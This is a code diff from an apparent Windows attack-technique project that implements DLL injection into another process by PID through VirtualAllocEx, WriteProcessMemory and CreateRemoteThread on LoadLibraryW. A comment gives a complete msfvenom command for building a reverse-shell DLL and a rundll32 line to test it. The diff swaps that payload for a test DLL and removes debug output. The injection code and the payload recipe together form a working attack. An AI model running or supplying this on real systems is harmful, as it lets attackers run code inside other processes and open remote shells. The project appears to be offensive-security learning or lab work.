@@ -17,8 +17,8 @@ int main(int argc, char *argv[]) {
     // Reverse shell to 127.0.0.1:31337
     // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
     // Can test with rundll32.exe reverse.dll,DllMain
-    wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");
-    //wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\test.dll");
+    //wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");
+    wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\test.dll");
 
     // Get a PID, error out if improper input for PID
      if(!argv[1] || !(pid=atoi(argv[1]))) {
@@ -31,24 +31,13 @@ int main(int argc, char *argv[]) {
 
     // Potentially won't work if cannot access process, can't allocate space in it, etc. (No error checking)
     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    printf("err1: %d\n", GetLastError());
     remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    printf("err2: %d\n", GetLastError());
     WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
-    printf("err3: %d\n", GetLastError());
     PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-    printf("err4: %d\n", GetLastError());
-    //int temp = (threadStartRoutineAddress)(remoteBuffer);
-    //printf("LoadLib ret: %d\n", temp);
-    //printf("err: %d\n", GetLastError());
     remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
-    //printf("err5: %d\n", GetLastError());
     //WaitForSingleObject(remoteThread, INFINITE);
-    //printf("err6: %d\n", GetLastError());
     //VirtualFreeEx(processHandle, remoteBuffer, NULL, MEM_RELEASE);
-    //printf("err7: %d\n", GetLastError());
     //CloseHandle(processHandle);
-    //printf("err8: %d\n", GetLastError());
-
+    
     return 0;
 }
